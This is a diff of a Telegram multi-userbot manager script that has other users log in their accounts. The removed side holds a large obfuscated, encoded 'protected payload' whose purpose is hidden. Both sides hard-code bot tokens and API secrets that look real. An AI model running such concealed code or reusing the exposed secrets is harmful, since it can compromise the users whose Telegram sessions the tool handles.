@@ -1,649 +1,5985 @@
 # -*- coding: utf-8 -*-
-# ══════════════════════════════════════════════════════════════════════════════
-#  👑 CHAMPU MULTI-USERBOT MANAGER — COMPLETE SETUP & RUN GUIDE 👑
-# ══════════════════════════════════════════════════════════════════════════════
-#
-#  📖 [HOW TO RUN / CODE RUN KAISE KAREIN - STEP-BY-STEP]:
-#
-#  1️⃣ STEP 1: Python & Required Packages Install Karein
-#     Agar aapke paas packages installed nahi hain, toh terminal / CMD me chalayein:
-#     👉 pip install 
-#
-#  2️⃣ STEP 2: Apni Telegram Details Set Karein (Niche Lines 34-36)
-#     • API_ID    : my.telegram.org par login karke 'API development tools' me milega.
-#     • API_HASH  : my.telegram.org par 32-character ka hash code milega.
-#     • BOT_TOKEN : Telegram par @BotFather ke zariye /newbot banakar token paste karein.
-#
-#  3️⃣ STEP 3: Script Run Karein
-#     Terminal / Command Prompt / Termux me ye command enter karein:
-#     👉 python usb.py
-#
-#  4️⃣ STEP 4: Bot Ko Telegram Par Start & Use Karein
-#     • Script run hone par terminal me print hoga:
-#       "✅ TELEGRAM BOT MANAGER ONLINE: @YourBot"
-#     • Ab koi bhi user Telegram me jakar aapke bot ko /start bhej sakta hai.
-#     • "🔐 Login Userbot" button daba kar Phone Number ya Session se account login karega.
-#     • Account connect hote hi userbot automatically online ho jayega!
-#
-#  🎯 [COMMANDS & PREFIX GUIDE]:
-#  • 👑 Master Owner (ID: 8703047687) ke liye prefix strictly ',' (comma) hai:
-#    👉 ,menu  |  ,baka  |  ,bakarob  |  ,bakakill  |  ,ping  |  ,stopbaka
-#
-#  • 👥 Hosted Users & Client Accounts ke liye prefix '.' (dot) hai:
-#    👉 .menu  |  .baka  |  .bakarob  |  .bakakill  |  .ping  |  .stopbaka
-#
-#  ⚔️ [BAKA GAME AUTOMATION]:
-#  • Fast, smooth aur 100% flood-free architecture ke sath chalta hai.
-#  • 2 se 4 minute ka thorough deep scan karega aur targets ko auto-raid karega.
-#
-# ══════════════════════════════════════════════════════════════════════════════
-#  ⚙️ [CONFIGURATION - APNI DETAILS YAHAN ENTER KAREIN]
-# ══════════════════════════════════════════════════════════════════════════════
+# ──────────────────────────────────────────────────────────────────────────────
+#  👑 CHAMPU MULTI-USERBOT MANAGER (usb.py)
+# ──────────────────────────────────────────────────────────────────────────────
+#  [CONFIGURATION]
+#  API_ID / API_HASH : my.telegram.org se
+#  BOT_TOKEN         : @BotFather se
+# ──────────────────────────────────────────────────────────────────────────────
 
-API_ID = 32939383
-API_HASH = "f9afe5e97b369160188b59954fa2482c"
-BOT_TOKEN = "8771631600:AAGBZWpanwXuNKkW40t6dTQCE2YaAPvQfEM"
+API_ID = 35372184
+API_HASH = "f50bff5d1b5c1e9bda29e3ad8f190903"
+BOT_TOKEN = "8771631600:AAEOtxPKcBA5L5xMMhpotu39vk8RVn9OmEI"
 
 # ──────────────────────────────────────────────────────────────────────────────
-#  ⚠️ PROTECTED COMPILED PAYLOAD — DO NOT EDIT BELOW THIS LINE
+
 # ──────────────────────────────────────────────────────────────────────────────
-import sys as _sys
-import os as _os
-import zlib as _zlib
-import base64 as _base64
+#  AUTO-INSTALL: telethon + pyaes (host ke wheelhouse me pyaes nahi hota)
+# ──────────────────────────────────────────────────────────────────────────────
+import os as _os, sys as _sys, subprocess as _sp
 
-_0x_SECURITY_CIPHER = b"ChampuGod_BakaEngine_SecKey_2026_x89"
+_LIBS = _os.path.join(_os.path.dirname(_os.path.abspath(__file__)), "_libs")
+_os.makedirs(_LIBS, exist_ok=True)
+if _LIBS not in _sys.path:
+    _sys.path.insert(0, _LIBS)
 
-_0x_BYTE_STREAM = (
-    "JF<<?D*{uv(QmlF)WessZnP><UEk(b=UqEZk{@u?7rNmGanDE?=h5|*^6@O?$;>LIQGTg?JAI=AFLr7("
-    "75?{lJzvh}`sC2k_Zr{hi+W9(hV8`Lpb)1nqd=?Q=P=CmSY=0pi+XvzPPIJPUIyw~v%@j0QnuM4dlj%9"
-    "AtwpTw5{o`A5&1^wdW1;_6|#!^u#d&9TdNAOJus@D4pYJtKMjPh$epM5cEWk3DplZkTJ=5oZq`P5xe#0"
-    "HrJt<aP$NqA^iUKDbQ6Qr<wr;DINZl7hh_-<SgGDF9hp|5!5Mqs_*MaMX}tUmLP;npJMUS@JEtw2mPln"
-    "eJ{~^VzU6kpn39+__#Et@dc@IT-MU<`ti50x^%S%VUSQ96n)o>Jb;>|m^xikjlW_3$$%Bosp5<shZrPY"
-    "`Kd_VpQkM${JwQ$=_B(s5H-^e7ZDzZm%FVs&-2dSXM!k&it?n;N|0PWN4~mBzx9F-+b@Lav<xCrbXK`^"
-    "yKoQD*T`AX^8$rqH2+Hevcy<LG4zLi^A{$5I3ITgn5mq2_IS=iHR=gaWwu0&9dytQ>th0@2ao2oWchVE"
-    "UJUq&{Q;;RejUR(<&7wm##^2W=sqh5bM<|*$yBHr$ZsJoXG%ZG5B^clnCL1w?@4yXvl!>W6ITtI`Bs6K"
-    "gqyPhFmNyK7FkhMYc-K!RIRiJzw%B8%r%`q1s73YOs{bNL$9j@rVWXRImNW_)Bmvs@9wOoc$rur!VC^P"
-    "CZdP&CBdvAq6l44oz<vXmAu!x)+x5(twMj$EL-P7oKo*Q?$WfcT}xGW6(c?ohk>nX?_ZV*pu4TY>ZT%0"
-    "z;{vvSmr0tcw&0t*Mz?}yPJ}?&xpvBC1$^@BaZp3&`?4!B{AJm6|E79rwr58oky;djIPU|+8vtT#+AM$"
-    "WjHa2ig%OrPfM-nsEmd>xWGIUaX6j&A{nbi@Y4%<%QLNg`&>oEcAJYa85vGO`xhk6;Je8R(iDU(^^ZGF"
-    "xUvfMw7(FJw!A5hFprR8eMQ|5FBnqBkSC530<W8tfZqS)A6G(izFbaI??jhy=(=V@yWQ>^`jrLAb;VWU"
-    "ScL3Y==|ie+lzyS8*Gs9Lxx?Ai^|yECZHMK++N)RM4ns_5W4x2W2xq+Y^H*5&WR7dF>4}p`;jf`qwc`c"
-    "xsb`&%E>&Cvo^#`cbW6hx*j;Ne|1+`Yhm4XN=i+%M<80nT54CzgNYhB9_p-!i;&xtA{a~dlj15u5tDa{"
-    "-~p?l)Z=e(j^YlY<}Qw9I9Q%LJD`TK7~(we%$RUrDj&Z~EntJ+944h?>cV9YsAI#}ZdOfAOwzB$IpkO7"
-    "CcSvCWv`Pv_8%jUHZb)5xOu<y1<U`U7isKUxjGiD+4P`npUys~uGYiq8(NadfR}@ovMB#&Cf{IEn2#-K"
-    "c&g5!|K%RUr?m(PhaG$znt5?1LPq*h?D3eB*xmwk6Sz(BW)^m>&nEBaZYzUKlslINczq?D4przAEYe(@"
-    "{@#i^(=6zB2B~o5`T6|%RorXV3n79Q>^$aPTS?XU<^jZyeyu3V$R&+ygHg+Ynrm@A5T*PH{nh>MrgQZ6"
-    "H#3yzho{9<?Dq@QeAX~MoctBmLirnUQbLGnPc>lG$F@ndKUhTQF|;BV`lrXIEJLVTjj{k=n3>Cc{ssA`"
-    "T<(gi@ty95USz>TRIqXUX<RAOlwzf3P+jf7CaSEnw4}k6s1bV?QG+|MjGiVrT@bW{Nbe8TcWKuR#o8zw"
-    "Y9$3}S!f)rJC#^c7fyGS1TqkZ1w$Mx;M8aWev?RIX;4JEowf;0$0uO0VS^@Vylb<nOZN^_N{h@3&|Mc0"
-    "XY&^aRMA7bKFdhiHnR8A6a}NS?AN$k5HUOR0M>N9JOC)hMc$>rXdjp0H#$(hSgCB2`N-&s7Gn9HslEf-"
-    "7z^kW+E`!dPVy%R!tA^ZtNa#UXR;WHRkJq6D*%ZOB|R8j2VLM2K`7jblxk0+b`esnBtPjs!2o$4Q?W(6"
-    "GipwOAua@abvPxbBp2``WdG;BNNraQS)hTVK=oGt?lIOsfHf}vVc0O{)W}amv<hk?!yBR^!#|na>>-)l"
-    ")w8Fh*+!>eA9as`MoK`6u)%o)w{SE6YH3__d1NC^F)CN3jX&3aYS4cA{yEeI`S`2dZQ$VsX?s>%2mx~u"
-    "jzLr8lZhR%hA3@<DKAdpmr@BUIvA1`&=HGaMXI4GKtOd>Rk#0RAqI?DV3H`6>vK9T(xq;-%Yp$lIM!s^"
-    "w@VRIkV?9&$9%zq3*m$1?nD<^e|wfsPLTN*Vs*p5sVq`~EEGecpYlO_J%bcv8y|YUP`F9qBy(^54g||("
-    "#}a~4WjPe<1th{{>6_-YsDjH@?fwh5GM4SXGe#lgV$m??9i}WN17HIOaak1^d)7vPsX_K;qLeTuQO@(s"
-    "!H5MOjs#Q+gc|>f=tnIrDqIRkyD(Kwm);uvY!|W2%6)psZhi3hMywWVqJVr95d9365FN@pD*fv+%NYFo"
-    "Mfi6ANDd884cu0?BlW<WaD`kUITc~^*dh+n*seoKvi6s(?j432ffbA3Heym@WC5tgNQG<t$kM$4ZfM~h"
-    "6IF{$imK39TjsjH{0a>ikhEfD%%11iWy>ui@<&ilxNc|Lz{^6<Co-5B6&WoOWe*rvDzS9>kR~~>J;z;7"
-    "(Y;vTO4j93_j;qRQP=Zm72{L>bupuu165M~v@95jUa;Ditz^(A;-GHe@SC&N+CHiX<d#v&td?I<5g00N"
-    "=hzCUEw7!D<f>=py_j5=$Op_&y1C8zm(bsMS{D<Zr4An#yhjEDkiV_T-bV)7%(oh--zlJZ3a^D)mylBt"
-    "JB;BH%CQQO=)Q^W#QuFRXZ}i5x{9{i-^i$tnXGNI<ZV}Vq4=+aJR^_0(S?s$%_tTU<jO?R{>n`aZs=C1"
-    "QaQzERBc*{lY?y_eVm^x7rFP83i9>M%bq}<ci$iw^4D(LsMUqu|A4`|ZA`wSTNPApo$RVFU{vpRb?_pG"
-    "TAE5|(W2WnNIA0U6I<S6@{8R78$Pw<knrESv)lX-YUEPVH{$0ow*NMmFx6!YKw6v~$C9e|{cUMa(Z@@!"
-    "(Yjsg(h4<F7dgKAvHyDu3$gkSUAi}~yjG(ofbG_wadBs^0rO#2WJEcq>1z}Q2+g*Jvac^Onxz79f+&5c"
-    "*6!m7iRU1lb>0q>4Wd;9ogZmq4|W86-f|D)_n^*O3XCtZhnw}dLfzxvREjmTGav#i6%zly9XyzgZvT%M"
-    "8zUqk@paqlir~y^mOfK0O|WJ;=h}{cQN;;E9vVaDBKIqKeAXQU4d45}Izn)|9Ye?9DCo0fo)I|7VE*R0"
-    "fBf%3dEY=K{QqFf-uK8xAOFpEU54t;X`hz>_f;U37<xKUIGt`nu(1#{$4lh%j9VatVbfPy`@rpjYkGV{"
-    "uFR^SV7*EMlqOut-z^BXAQxOiJvlP~f=BO&i1u+>j$bqF_~z_9lBdyY1U7S85{I~K9~Cu<->Agj8;I?;"
-    "PvitkVh|SV4)VSU!x`Xf)e~m6k`34l5FQ9^2JNH3rxr~h1Cre~DvV_SQ%NRq`D_TQ&61NPB);SFMFPsa"
-    "7SRibs|#MZ4y#qK2CHxJacT4CA@e2SJgjvQ_>XTLJEBpFN8o>Epc4dD%$>9HISHWHf|2A!ULZoDtQRLo"
-    "_ir0q%H}>6pxo2syaXW-KUVk9vhqb*L$;QgVp3gI5&25t>rsJ1NX1_o;(Xq-+yT#RRO@XB(kFWz_tAH%"
-    "*G&{XGTB#(5#?(groRSCGpW%l>Q`fo-zr64Yrbs38}lk<o=3(_+}Tz`=Y~m5s^A9WT13Re;8Pf23_RKY"
-    "$BY;v<t54ypL-+CGDGeIrkuy8@dR<zU@qd;#sNGJM#+nNSmsp{I%(qs=->>e_Owk7l$_2pKcJ^xq%0NV"
-    "#2=~N$aecuTYi6tk)v7EJsD4bWa$Ieiof6?z;B9zp=&L1_0tXJ^?k{=;Geg~XLT|sBCai45I2eq1eX&+"
-    "VM9gKtjS#>+)jI;uWFYnHn(SBZXkMU_x0m6UlRww?@`NJbKU#vH${ZQ`?$NagSEX+;xQK6cITQH=3=2l"
-    "Z*Dj{@E%d(lv^auK_9ZML;Pio;He>+A2|;tbgWUCrC6MpOB(wb3%cnp{A|4#p28uj)SQ4!beNNjfp1L0"
-    "ir+8&fdAf?WWVaO-_m_Qc|?m59xl4rrG~=DABm@R4$)x!s1|~@qnFZ|oZbikG!mO_mL7)1oxI6%zT^##"
-    "L35=#PEE<RWYkYB`7Pm>yZZO9kAuLS5pKJ!h>o6~RYcsP4u!mN&dE_SqFZG~oai4j&s@A;1xn9Iv)#3t"
-    "p`ymfqp6dIoZH9Zz%TTL9~4wc5v!cO*t=aQBpQBar0a;JYkZMs-|nL}CHd-#(&@=x2%+N@jWMUW+<a1r"
-    "tm4TU(qj;SnSGGEpLy3C&Yq~B4p%6XdE|Ja@L(;ZTC7#E|8$<noILYrL#amo`68N)tdgc6%g*n4vByWq"
-    "y|wPT9$8#^ACYcUM*@>r4L_$%X_gHWZ!*`GH2OgkwQVw|aW}=2rX!+vTd!1z#%@f$Y?*^7H+*Lu^LZgX"
-    "lIQFo%${{E6bThqKi&@-iw|K2ih%Bxfm|x~q$C;`w2K0$-Oj_vf=}0mOps)kAE7GTPQ=;b4gwid7$#1n"
-    "v^cJD%!{TX+0Mxs4ogReJfF6!s=nCY?gQ*NqRA5EY;2{ax?lyK!IP!)D`<;du+O)gR(sLF`epb{0uDak"
-    "l8(6-j-Ik?J%I2O`gWQ`+(KwWA1v#Yf>(jb+U%n?w@Cs&G57Fd?riSo=d&ni1Kl9obw%m!s{D`DtP?aZ"
-    "12UX-9_Bg@u8cA(3!OQU#9w<pzY~Te3Nx9AAoPun6uA%GJ?-&kw`n80O)VbfSM>gCfBXLx1K}g&Lf$P&"
-    "C6^~g{nZza)e1WiZQ&7$K*N-!>ub^5Af#requv&PP0uh&i1|pytw#vxPe((^gc;&Q)E=@4<4}RwE=7Lb"
-    "4hF1`39#4Q^jC*lpO><7ryINe+7)16`1FGai5DN5qPCtC6jOU(+;TO7y6z$4e47I8lXq6rOJMlcm)7pX"
-    "r~l1HmyDq`q?@4sTy6)*w5!L%z84&$fQYk9ovgHkpq9E8hL>>)gRE}<69KyL!=%xeRVc(>+!gogVtjX-"
-    "tV_7JR)J438I7_gM=T)oHcJk@twB&o+*L)yjg6j_is)>Jgs>NxkXI4V6=0Ct(=2F`UmDe)?Ss(G8U)E&"
-    "zmIgBl<&Q4o8ilDHKr$==8@9j0_=j$f`Wa9>G227dN$+a+(8O`|5|gt8Xe=$tVWS?YLfhkq}wn_9_S#W"
-    "#pzYMj;k{YRX|{&%6udFbFv%Hk}~J2h*%DK4onh?nnJ08wW1f2m>;8At-=uS=gh_AuE3MB^ibJxH*%ha"
-    "a1(`^nxgg61{yZZ=u9D2vP+Di7}Fz|Z*aaYXb_KCUiQ`g)+r@P!r`8x{nU2m$s!GD&oEbsj(2@7X-vmu"
-    "f93M#?Lz0%adUgYW(SQXv0x>#(F2q1r9#7t+JvIWhNw?N+$A~ss*{_DtnB05^ya5wv5&HqFa$DzIX)eK"
-    "Mde8NvB<iEWRbER9~oe7MxlC7xleCw_NPIN?X2S7l1zYWUe3JUE|4p&EGE7ve|%BIm6#WV=w%ADKg7iD"
-    "`R(J4G4nSAqrWOO-4bcm0)%tJyU+W+>mmL%CAPCNXo-Iv=n>sI<Nd*{^!+sDo(-#m7xAz107V!4pr-qt"
-    "*%gyA82(2$Bsj@ucg~;?7_%E+={5IfLB5_DSd*!G01iH#vzpbpjE+yo!+EF1yNm7=yMEF_&o>>Tu3gF`"
-    "KRyBbzA2*|)L2sCS21l^Mm+9hwno%wg!yjJ<pA3?dDq$boe(w){)%J9cE<EhGI3+D;NF@cY38_J)Op`Y"
-    "l1#XeFui0}3@y8jnrhs-sxlXd=mOsO=qLX6pFe&wji37P8lr^G760N<A!!(SkqipW<{N>C+0Q#{q0>h>"
-    "=>$<0i@FFKbVNYE4q$4Y@3Jhm5;asqmiK%i$Jr}PeI}>=jvS^~!hGbnF>W^hDhEWKlq8B+@lxo>!7@%S"
-    "SQ1k}h#$=x&YAqC?_{@~hd7puj=q=l`Ow+V<Ei~3@|l+FMPEZf$cK9?MU;?yYlY*6h^;M{h`#j40(Gxw"
-    "0V}+&qzz*~5+_zM@ma~sgtUsvZcc!yIFB<yTgmV-I*^6FW;d7A<e2k$cxWR(;MOs!;=VI<KqUXC!bfJc"
-    "s@*hbJSjSXiY<u!f8$r=`Eq~gx#df|l>es@E^lt^blmdQ)`IdGo1fsifug=xH6Fe&-N@f7;KkdHG?bU)"
-    "55X|g<+wO)TY^}EHfU!q>7|zlAWDSfW>hN5Ow!%QxgLF)E)tBxO^*33l6+wK7Is{V;km1D{u1QRe#&L1"
-    "k-d9Wh1RyUXJ?@8%o!<}8jQ!wS?|&M@+|R=M>c^ofZn>nJb%6*UufCdkwu!AoT#y8U7;>Ee)bv-D>981"
-    "z@0Lu$<Z+@yb~oO9B>oWpJrK4w2ZMHn{+M(8w6mLYLa@bJPS(MHIQlXz`N(RU9em8(*qtdXeFQYWo&R#"
-    "Z?rxdt`jns=ML>=5$f3X9|x&X4*6{ofwhsFG09Q^V@g;GL^j%ay3}eHayrA9z2DLXWlZ)qP{oI$keWb*"
-    "dpJ3w7dWMYRpKppMLQj9JDZ?MOoq3qGMQguyRml@#_-qzg*X|Rl15h$Cwf{A9tUsf00$!TK61C=0N2ON"
-    "G?$p_&nr+dJNJo#gZjFOK^1!{9*UCW^qZIP<@tBIK-Gnf|DKP^hl;=6g`>a1w4S)lj24j%s=V4eT?z^r"
-    "94EjLB!zAE++<HQuJibh^{A9OlY)Pe+H4Vu*X(+G@Dr9DQqIT#+#AG(Y?YLks@iFY+9jdazfvy_pjpX2"
-    "Ss`IXdbut!UlEF#gEBVGm@{aD$L53*7j%OhSXi0GJYayZn<F~h@Zg!@Oa}w%C|6b(`-eXveuCn{V5sMX"
-    "lN>ljhMt>&FYM6vs~b{g?q`K0gD<Q4zJ@pNi>RX?+veAS6;gb%P~UvHXu+nQg){r4uhc^6fig(u4PaL4"
-    "gsKGy<G^HIP?`6B3)qe7-}#vGx0&+t3Zkt^j;?TzjLNzSp_ufCk_I-KN831fx>w~3z!uW1>AoJ0--Ft~"
-    "1`NX$`4xA7ge<eZEopjDvu^wWN0y_;%{|o|zm2HjqcM8HE?}D5%vH`NswVIGug_y3jajEsm0EuMLBTk8"
-    "fuMDHS(ctD0zUnV$yy-lUk)?)rN%4D{()Zi-fQ(p1=bI~Coz&nx=mtcEF$z^+qvS`vf(WMI9rf5rUI{T"
-    "3gdIBB2qBn;v7j6z(Z7@Hg)dOlOfykHxn1!VV5UizQ<{8Rp?lAjjeNXORdFz)slDpjFCBUIs|r2@7?Q-"
-    "sz&5WHRYrDvv&&K%%i8MA5Vt+LkbercLq$roIq0Zmi&rG>+Qp{wL^`pxq8cq4SNuIy@@hJ(;jDX9Z*Nl"
-    "o3O<i03J$xt%uL^BOGE}%PX8-BX!i{8HT7#b~MZsZ#h``C#S!Vi#or(fF{>NS(?Bd3eg8sS5#Dd%=Wq)"
-    "BPE&AyM8%`N(2v~iWHO`eny>@;RE;_XP4?g2mZ2PgBZ|zKOvHPiyc<4HTsf-aAJ-De6KuVKzlv+En{x7"
-    "P;(P=%H$DPp%A~PaP8?BgX5x*S9!&@B#S~d>fH+~1cb8imv1(LZZj%LC&IQ{dcYVEvLr)wJ>AfS4M{jd"
-    "i(=dxBcu4^7Lu+geZg<a3u`bk7qxV?dNWgBfyH6Ss7t15@M<B}c3|h|0Uj<5{fE`@RmlWzV4`#b+wlB<"
-    "`XJ4^Rx`rOW{A3yPUQVS<ibeCoVy2buaMQeYL`|@dS)wL8Fxp9AvG*$m<*)(14*8%&$_q%*#N9<NrOA("
-    "eJ$VRpHuMZy6}F)r%Le&y%CsiWFm-Xdr$w;NKB;bA+gK)xs2hyH)~7w*G4?m=s#==Hjf{+a-g-i;H_M}"
-    "tg0k=ZN^a?mTJ^mq5VHT5)y{d=gSUcK_x*l{Eu1;VP``@ja3yVk&j#q>|c!SpgC||S-K?&7`;0w2^B$n"
-    "%P5S~p>P;L%wm4&&^V0I%xmkRoo0u(Q?j>P>rf|~(;co7_mSe)l=iaC_MwKL#li<wGL5@2e5VpKHuNlE"
-    "yMg>D<PQ|fm^To%GJ9~NA@B5A#~yR2Uc#$2UG`kJ9@QsB(W#`)3$ab(%b`%gNbH&GWIG92rn}(JL?!~|"
-    "yqdfA&pYbUABc*WKv==W>CtGK!E)F!@*wkwwbKGLD!0P&eyjL^25y+#?||obj+*xGan$HLPGtUokaUNo"
-    "B{`0%FN}_PI0ql!QBggd2cZ5xP>!JEr=cCA=(ms=*KEftOg7aLW7l#Vjvx=dXuG#^A4Skjhb)g<JKE)l"
-    "Yv6y&s?ZGacY7i%U!!_u&gqFU$o@kjAsnZy`sx`kYdwTqv!ttHN_gDHIYJ~DTOQpzLEA0TCZx2rQ|KsA"
-    "t+No3q&c%|e1zgWTcjyu(+LwaO}>yUF><CQd_}724(yQeu!`woYe@+2`M%lUYF^Oi2x(;(Vzr8)9kn;m"
-    "PzAkhDpwKFoA1(Es#x&MYnV1QcHOA3yFex>4&Xn@BcBTy3Rh-iYc-bzcjwA#lI#|5M}Xu2GT~m#aa8V>"
-    "6l~d0Q@|JEQv6Tdr#idyVic#Nt$Z=`_qA0!2<N|X@wC}qKt#q5MKPGf92OqGdO%*gq2Id`j1c(EvBVNr"
-    "-kT2!jN`rUBxmE86r{=)PIn2_ufN$ArZwtFf6c*o9ORALWDVxFI;cvMSXiE)LFzgus}3&|SlmNf)ry|D"
-    "FMH?Knx7!c(!C%KDclYZ<ce!ZQjX{4$cAdS{;-p*M;WDt-c5Ld4`5CaMJIxg!>VQySwE2=Tfo=vbazmR"
-    "Xqr5v-TpM;+Ka|QE)3`Ieigf?aDIM8?TaYGi2hq6hpkj5xOt#|QYDCFkmk(y5woVg2<9x;gq$sV1%Uo&"
-    "BOFYJ25p2vyZQnquiv{E@(OYI5McrJ&k7MX0bZ}|eFg|ijdS3O&0POS%F`SLs;AH<q7}Xp96v3pF+F>Y"
-    "hUwFv=8Y@3NIwL(GmW_<sS6$i#f&Ih_02h9jC8c3y0nvM+#UI59Bf*0>LSzVNZb#uh~u-~6o8^$l{?59"
-    "*nr#fgm`FA?hox@%ijjM^7FFg60OhFKp{R{NUlu59=-bxzy!LBFdHC)@(VF7x(qeTCsPrL2c!bgkp0P!"
-    "nMz19@KTR+?s2&iPAzhBsYo5d1@b*xe}XA9wfM2)IZQF1dh$0g0b^NkPd-d1-VL0_RE@@K8s09owq8Pt"
-    "_4RLobV*vSQ?!rbMKi#)CI=DPhoZsMY{7pf(+3*st>GD$$`<UMvdnm#cLf}BbwFGlx4*<!t6l}?4WwAO"
-    ";U-|oJ+8t>u_8uCUSlWr6--@2`v@8$SPvDuo%fmY_%K5uQ+K`gh=qx=^1s$3c+5Z>=BYNfKL1t=CrILh"
-    "YxL;=8qDsKAL^EulMOa}K$go8m4DD@h8$>9@XmON)EEf8+UC}(Y#;?ekTDIkt*pR#eZ(475{^3FMyETy"
-    "heEK@QpCoAcbUClJ#MLl$-kKPNK)kb;*gwUBbGJV7}KAqTN$!e{!;*ELL{x0cd>LTp#ecpxbV#93qnHU"
-    "y6V3{g>ahCj`mcy3Szec_C9?M(!3`%!~d7J=tlv3J>2hkj-xc(l_o$D2M%Niz)cL_yl0}6Qa%D}Z4ajW"
-    "m*WF&--qiJ@!du7;NY?psx#K~5g(+9Ov{ff56_)Q&sv8nQik(%+4WlC4`{8-gS6nexrQ#X|4;+&X1-^a"
-    "7<oi5{xyDVa&u0}IZfw3l9NZzPG;MzKtc8p<uu63O*_L`5CDvnCRP{p?e^rQUQhb75(zEUrdSip|MqBx"
-    "7>h|LsH{9iSAie^!CMS9{73l-QJe}WPM6gPim(4aNKnb*JgfQWnHw4~82%7q+&ub+MCa=eHI0Ph3mQ6L"
-    "&EmoSCemcaHi?2AnC{=SlAX6bdCZP6EN8_6V#;2Ab)0+H*`YRv8_J@5NBLvrv1v&kJUzyHQ}woS40sMz"
-    "`pDgK;@vE9stnj<is0@Nl!;!<09>rEnMZ7%pBc^m!tV>wtzhPkLb?4q@4X=RcJ~&|z#ia(tq87e+8Gq@"
-    "5b!mE>ASY{&?o0z3wPCJfDT%cFR^SD`qtYE4o%UJq9SR&@i|_hh>btR#4v<*%JYP1ETrKr#0pW3L`YS$"
-    "aEPgo>d3aI9&?XK?+0T+&<i`gHaCS`4s;lDfn4>=iL|I0db-j5YXYykD=5+ETbx8G6ZWTFQ;U62Q(;?l"
-    "q^fD2rR@4?S%W#?_u5XA3r*?ON+9w~qDb<;)I;xnY~M@uy-I#5+yErM8I-X<8E?uOb}c*^BF-Yfb!l74"
-    "h;>epOK&9x^Dq5q;hgjkRy`G3r@Ct_U}OADs;YPSPIhx;S)S@>{8%^TUi_nnOd6c`?UfzX$IYn*4Qebn"
-    "-U;f^AUr@>3S@eI$6QD=ITW+*2d8#IaMb6%9yzfQNS%<c4epoUFk)e%u{i;Te|J~o7nx+M*iR=nIV$nQ"
-    "(<+$VnpsGjX_jH9;ch^cI}?p&wuvX-6jRgFt!O5>cQZv~&qWi$tbs>JId;)+>;}!D_DopcYX_+|*kb6g"
-    "aYxx&<ySOhL4TNI5W;pF4C?Zwx!vi^I1iYJP~|REPoL?<S6OEk;7Jb#qQi+<g&D@XNi8d&xqMb%cJ@v5"
-    "w^%O~3h_5M2^=eI%QDPi2^7NbllfPnme^HF_dF??AS7<<5LStNpOSlo-#Ih+Eo@z8+?FaJi5qa$3q24z"
-    "8|K~75oXByHE&rS28IFY?QN6yy88S_GyxF@Vk|bIKCM#~n}Uq=Z^ofio3ijOO<_JM><dxSBj>uz9vTDl"
-    "^S3Y~sk66W2pbj!V?lBM{iSx>0fE%#cYyXOYmbm>Hc{&tCt5=4JjB^28b5V)^#kErNZ@DLjxif|y(NAi"
-    "NF-Dr);fg<u)L=fLDmwl(#09Ad0X^3PuMn`<DMq<6^teXh0Cn-P%f50|K7~=K5r&v(|ogWloR<EF~*xn"
-    "R$-bbGF31l8vD#8g;eq^HPi1QzNx8=C<`x7IE+OcrRA#o1#cN@sm=(@XnkBhjgv#my5Y0d1BVr%J(DL^"
-    "rmUmSIN79@)Hm=xl6QdnHJdKnqO5#Y_8B%Y(Fj~cS@cW<fsHB348l}5?~o$2DJOhbIZ7|ygkS}4%GA9e"
-    "+3=2A@dQF&P(AwZY6hyqV+dm8n~u<9f#MRfvz9@HIswSLi%Atu62m+4(qB>tM<7>iJNYoz=|@a)l6j;T"
-    "frv=o?~JQILhfMBCW>CF^w?$OA306Gh_jn|lB0_x2_!m6?<NK)+1M$qeN#mouyp$sPIob(8BzAM@l&+&"
-    "WeX95GO#jGQ2yl=$G{VcX6$ZU-~*n;AEzwfiCdFI-36mDCX<eK4dIFr87cPLxcPG!(E`2yK4<XR0nRTt"
-    "kHC*ijKAT*or!A49*oKPv3P2B4Ag-foK|vETZpKqSz*9rGy%fVX&5kH<JKH&cCPL}1Wbu@7}c)UgT(t?"
-    "=dn5>fE5hXWsBirQ1#=N(_0F56v7z#%BkT()HU9{76xNSC(>LMG4!;n%K49=yv3}c&B7|FPA*;mnzY#)"
-    "C2NSCIA_=0r%B+3KfxWAq9px$OU_lNRYf4({e4u0Ho6jEW<eQw40@(R*ngE}BJkR<!znHp0#7POuQEyE"
-    "BN3XSPm5mDH7-R148IAHR(AN<tfxA@iXbKq4|SrSq7><p^(OijUd!Y9bC9F_h5!d_y(8&$`bcbX@fBCk"
-    "SG981<g1exS<@Q_!}f#`J-&o<TlipeXGUH}*i@uh0F7~&6CN2N6L?)qSAJwhEd=r}INGHEw(*#ec>l=>"
-    "P}GsX+o(u8A6oG_b7(Fzp#j@=KYvs$l0HJGE*#cMu9RH2yn!S?nt3GJ6UdLdN6^7~t-FP1L_=hptZMJc"
-    "+`v3!fir<g=+@)H=z&sMQ6G|hW+6Z(=mT_wB-eb}E^iN^gl-~(Ue~i+BIu-<K{~JCIupzNDQg&D4B~ks"
-    "y8gG4d65XAAh{3e)?jISZ`A!a9BQLOQ>?F@TXGtl1=fh_r|&v9yJFu{<df;Ymx`lJtGCb+SvyB&B0^T&"
-    "_um*Q7#5VWsgmL0;xlw@FnnopHKukX9#Ne~lI~V!u`2W#N=$ZvSlua&96hKQhRrBEf$z|nx3c7~xhb{@"
-    "iHuDd*z?OHcVTn~1>S^?e>BaCG@?j(l!9N=S}C3Lkk-0XA6k{zzq5^mjXVI$L`>wCX$Pqm+lOGVJt-El"
-    "^uAMI1~ze4`qZm4161g~m+m~arDIcF#I^(`VWgBaM~Ohut@c=_`hGICIFK%^vY$$zAiR@%XicO-NkA#q"
-    "yIS~yHyV19Z(+HVvSc)3R{+WP$FTWAkmGJZ4c8Si7SoGLr*4XOTdZ^T$`?}v1E(;WCf^UDz~HVpSbTpd"
-    "&8MYzbFqM{tJBfTy1EqrO@>k%s;CvQi@6->am=%jB<9JmPGE3-?e)28C&mpct{t<((>z7cc7O-CbH3ML"
-    "JR!Q12Z*;Kz->*3tZ}v+V<IdBP4Bz^0G|#4!iuT7-(B1Igth}uLGy=}hDDgFwRVluQhtH&Oy)NNW0L^r"
-    "R1~fWI4~xlL&>c@Gst(O83#@s?FIwDP8)or4oIdm!+HYG8lv}s@eWpt3d_Q_pz3Y0T{!0w7B2l*l)n{`"
-    "u@O|Qm_s6&HMyHC`tl-i#mOSf8Za^*&?goQS}(T<;1=ni#Z)ptR-g?mwK5?5KTzlj53xwGO)gU?dWcV="
-    "LU_c@juVG;?cb;vIKDOk8T&ZEG1gAq5jz}6)#OFGNlck?RIL#K?}Bvq!b~3EJVQ(o4<vaY{uG4Ksgo^F"
-    ")QA>DI8TY*LdD~u5XfMzVwJNUcmP=}zTdmMcm`wn^7)Lks0ABWp!|7JK7KoVF|l+Ok=>X`5i6l%KudRW"
